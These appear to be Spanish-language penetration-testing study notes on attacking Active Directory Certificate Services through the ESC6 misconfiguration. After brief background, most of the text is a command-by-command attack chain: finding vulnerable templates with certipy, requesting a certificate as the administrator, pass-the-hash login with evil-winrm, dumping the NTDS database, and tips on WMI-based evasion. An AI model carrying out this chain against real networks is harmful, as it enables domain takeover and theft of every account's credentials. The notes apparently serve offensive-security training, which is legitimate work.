# ADCS Attacks 

Tags: #Windows #PrivEsc #ESC #Linux #ADCS #ESC6 

Es un servicio de infraestructura de clave pública de Microsoft
	- Emitir
	- Administrar
	- Publicar / Revocar certificados digitales 

Utilidades practicas:
	- Emitir certificados para autenticación en computadores / servidores
	- Acceder a redes Wifi EMpresariales (WPA - Enterprise)
	- Acceder a redes VPN

Componentes:
- CA (Autoridad Certificadora)
- Certificate Templates 
	- Quien emite el certificado
	- Duración 
	- Quien puede usarlo 
	- Los permisos 

# ESC 6 - Overly Permissive AD CS Object Permissions

**Requisitos:**

- EDITF_ATTRIBUTESUBJECTALTNAME2  (Notario) --   KB5014754  (Parche para eliminar la vulnerabilidad)

**Que puede hacer?**
* Permisos en objetos PKI en AD
* Modificas config de CA
* Modificas config de CA

**Es un:**
* ESC1 = Modificar un atributo "que verifica la identidad"
* ESC 6 = El notario acepta cualquier nombre (plantilla) que le escribas 

## Enumeración General 

```bash 
# Buscar certificados vulnerables 
❯ certipy-ad find -u 'user' -p 'P@$$w0rd123!' -dc-ip IP_DC -vulnerable -stdout

Donde se obtiene:
	- CA Name 
	- Template Name  
	- Enrollment Rights -> (Quién puede solicitar el certificado directamente)
	- Enabled = FALSE   # Quiere decir que la plantilla no esta publicada 
	- Enrollee Supplies Subject = TRUE   # Quiere decir que vulnerable a ESC1
```
## ESC 6: Forma 1 

```bash 
Paso 1:
❯ certify-ad req -u 'user@Domain.corp' -p 'P@$$w0rd123!' -ca 'CA_Name' -template 'User' -upn 'administrator@Domain.corp' -dc-ip IP_DC -target Target_Server_Name

	# template = User (Aquí se puede usar cualquier plantilla)
	# target = Servidor donde se usa la plantilla 
```

```bash 
Paso 2:
# Autenticarse usando el certificado obtenido un TGT para obtener el HASH NTLM
❯ certipy-ad auth -pfx administrator.pfx -dc-ip IP_DC

Paso 3:
# Conectarse al server como Administrator 
❯ evil-winrm -i IP_DC -u Administrator -H 7a8d4e04986afa8ed4060f75e5a0b3ff

# DCSync 
❯ nxc smb IP_DC -u Administrator -H 7a8d4e04986afa8ed4060f75e5a0b3ff --ntds 


NOTA:
	- Si no funciona utilizar 'WMIExec2' para la evasión y conexión mediante WMI
	- Puede que el usuario 'Administrator' no funcione, por lo que se debe de ver en Bloodhound que otros usuarios son admin y emitir el certificaado a su nombre. 
```